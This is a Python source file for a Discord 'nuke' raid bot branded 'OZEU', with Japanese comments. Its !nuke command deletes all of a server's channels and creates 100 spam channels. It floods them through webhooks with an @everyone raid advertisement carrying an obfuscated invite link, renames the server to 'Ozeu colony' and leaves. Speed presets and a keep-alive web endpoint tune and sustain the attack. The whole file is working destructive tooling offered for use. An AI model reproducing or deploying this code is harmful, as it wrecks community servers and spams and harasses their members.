# main.py
import os
import asyncio
import logging
from datetime import datetime
from typing import List, Optional
import threading

import discord
from discord.ext import commands
from flask import Flask, jsonify

# ================= CONFIG =================
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True

# --- User settings ---
ROLE_BASE      = "ozeumember"   # ロール名ベース
ROLE_COUNT     = 0              # 作成数
CHANNEL_BASE   = "ozeu"         # チャンネル名ベース
CHANNEL_COUNT  = 100              # 作成数
REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋]\nhttps://cdn.discordapp.com/attachments/1412757396689915998/1415191435954622555/frame_bomb_200_b.gif"
REPEAT_COUNT   = 100              # メッセージ送信回数

CHANGE_NICKNAMES = False
NICK_BASE        = "hello"
NEW_GUILD_NAME   = "おぜう植民地"

# Speed preset
SPEED_LEVEL = "爆速"

SPEED_PRESETS = {
    "遅い": {
        "DELETE_CHUNK_SIZE": 3,  "DELETE_CHUNK_SLEEP": 0.2, "POST_DELETE_WAIT": 4.0,
        "CREATE_CHUNK_SIZE": 2, "CREATE_CHUNK_SLEEP": 0.3,
        "MSG_CHUNK_SIZE": 3,    "MSG_INTER_CHUNK_SLEEP": 0.05, "MSG_INTER_ROUND_SLEEP": 0.1,
        "ROLE_CHUNK_SIZE": 1,   "ROLE_CHUNK_SLEEP": 0.2, "ROLE_MAX_RETRIES": 2,
        "NICK_CHUNK_SIZE": 6,   "NICK_CHUNK_SLEEP": 0.25
    },
    "普通": {
        "DELETE_CHUNK_SIZE": 5,  "DELETE_CHUNK_SLEEP": 0.1, "POST_DELETE_WAIT": 3.0,
        "CREATE_CHUNK_SIZE": 4, "CREATE_CHUNK_SLEEP": 0.2,
        "MSG_CHUNK_SIZE": 6,    "MSG_INTER_CHUNK_SLEEP": 0.02, "MSG_INTER_ROUND_SLEEP": 0.05,
        "ROLE_CHUNK_SIZE": 2,   "ROLE_CHUNK_SLEEP": 0.1, "ROLE_MAX_RETRIES": 3,
        "NICK_CHUNK_SIZE": 8,   "NICK_CHUNK_SLEEP": 0.15
    },
    "速い": {
        "DELETE_CHUNK_SIZE": 8,  "DELETE_CHUNK_SLEEP": 0.08, "POST_DELETE_WAIT": 2.0,
        "CREATE_CHUNK_SIZE": 6, "CREATE_CHUNK_SLEEP": 0.12,
        "MSG_CHUNK_SIZE": 10,   "MSG_INTER_CHUNK_SLEEP": 0.01, "MSG_INTER_ROUND_SLEEP": 0.02,
        "ROLE_CHUNK_SIZE": 4,   "ROLE_CHUNK_SLEEP": 0.05, "ROLE_MAX_RETRIES": 3,
        "NICK_CHUNK_SIZE": 12,  "NICK_CHUNK_SLEEP": 0.12
    },
    "爆速": {
        "DELETE_CHUNK_SIZE":12, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
        "CREATE_CHUNK_SIZE": 10, "CREATE_CHUNK_SLEEP": 0.05,
        "MSG_CHUNK_SIZE": 100,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
        "ROLE_CHUNK_SIZE": 6,   "ROLE_CHUNK_SLEEP": 0.02, "ROLE_MAX_RETRIES": 2,
        "NICK_CHUNK_SIZE": 16,  "NICK_CHUNK_SLEEP": 0.05
    }
}

_p = SPEED_PRESETS.get(SPEED_LEVEL, SPEED_PRESETS["普通"])
DELETE_CHUNK_SIZE      = _p["DELETE_CHUNK_SIZE"]
DELETE_CHUNK_SLEEP     = _p["DELETE_CHUNK_SLEEP"]
POST_DELETE_WAIT       = _p["POST_DELETE_WAIT"]
CREATE_CHUNK_SIZE      = _p["CREATE_CHUNK_SIZE"]
CREATE_CHUNK_SLEEP     = _p["CREATE_CHUNK_SLEEP"]
MSG_CHUNK_SIZE         = _p["MSG_CHUNK_SIZE"]
MSG_INTER_CHUNK_SLEEP  = _p["MSG_INTER_CHUNK_SLEEP"]
MSG_INTER_ROUND_SLEEP  = _p["MSG_INTER_ROUND_SLEEP"]
ROLE_CHUNK_SIZE        = _p["ROLE_CHUNK_SIZE"]
ROLE_CHUNK_SLEEP       = _p["ROLE_CHUNK_SLEEP"]
ROLE_MAX_RETRIES       = _p["ROLE_MAX_RETRIES"]
NICK_CHUNK_SIZE        = _p["NICK_CHUNK_SIZE"]
NICK_CHUNK_SLEEP       = _p["NICK_CHUNK_SLEEP"]

# ================= end CONFIG =================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("ozeu")

bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "bot_ready": bot.is_ready(),
        "bot_user": str(bot.user) if bot.user else None
    })

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# ---------- helpers ----------
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {getattr(channel,'name',repr(channel))}")
    except discord.errors.Forbidden:
        logger.warning(f"Forbidden deleting: {getattr(channel,'name',channel)}")
    except Exception as e:
        logger.warning(f"Delete failed: {getattr(channel,'name',channel)} {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        await asyncio.sleep(0.12)
        logger.info(f"Created channel: {name}")
        return ch
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

# --- Webhook Send (軽量) ---
async def get_or_create_webhook(ch: discord.TextChannel):
    try:
        webhooks = await ch.webhooks()
        if webhooks:
            return webhooks[0]
        wh = await ch.create_webhook(name="ozeu-webhook")
        return wh
    except Exception as e:
        logger.warning(f"Webhook作成失敗 ({ch.name}): {e}")
        return None

async def safe_webhook_send(ch: discord.TextChannel, content: str):
    webhook = await get_or_create_webhook(ch)
    if webhook is None:
        return
    try:
        await webhook.send(
            content[:2000],
            username=bot.user.name,
            avatar_url=bot.user.avatar.url if bot.user.avatar else None
        )
    except Exception as e:
        logger.warning(f"Webhook送信失敗 ({ch.name}): {e}")

async def safe_send(ch: discord.TextChannel, content: str):
    await safe_webhook_send(ch, content)

# ---------- メッセージ送信 ----------
async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    if not channels:
        return
    for _ in range(repeat):
        for i in range(0, len(channels), MSG_CHUNK_SIZE):
            chunk = channels[i:i+MSG_CHUNK_SIZE]
            await asyncio.gather(*(safe_send(c, msg) for c in chunk))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

# ---------- 権限確認 ----------
def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_webhooks

# ---------- イベント ----------
@bot.event
async def on_ready():
    logger.info(f"✅ Logged in as {bot.user} ({bot.user.id})")

# ---------- コマンド ----------
@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    if guild is None or not bot_has_permissions(guild):
        await ctx.send("Bot に必要な権限がありません。")
        return

    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke開始")

    async def main_tasks():
        # delete channels
        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
            await asyncio.gather(*(safe_delete_channel(c) for c in group))
            await asyncio.sleep(DELETE_CHUNK_SLEEP)
        await asyncio.sleep(POST_DELETE_WAIT)

        # create channels
        created_channels = []
        names = [f"{CHANNEL_BASE}-{i+1}" for i in range(CHANNEL_COUNT)]
        for group in chunk_list(names, CREATE_CHUNK_SIZE):
            rs = await asyncio.gather(*(safe_create_channel(guild, n) for n in group))
            created_channels.extend([r for r in rs if r])
            await asyncio.sleep(CREATE_CHUNK_SLEEP)

        # send via webhook
        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)

    async def sub_tasks():
        # rename guild
        if NEW_GUILD_NAME:
            try:
                await guild.edit(name=NEW_GUILD_NAME)
            except Exception as e:
                logger.warning(f"Guild rename failed: {e}")

    await asyncio.gather(main_tasks(), sub_tasks())

    await backup_channel.send("✅ nuke完了。Botはサーバーを退出します")
    await asyncio.sleep(1.0)
    try:
        await guild.leave()
    except Exception as e:
        logger.warning(f"Guild leave failed: {e}")

# ---------- Entrypoint ----------
if __name__ == "__main__":
    threading.Thread(target=start_flask, daemon=True).start()
    if not TOKEN:
        logger.error("DISCORD_TOKEN が設定されていません。")
        raise SystemExit("DISCORD_TOKEN is required")
    bot.run(TOKEN)
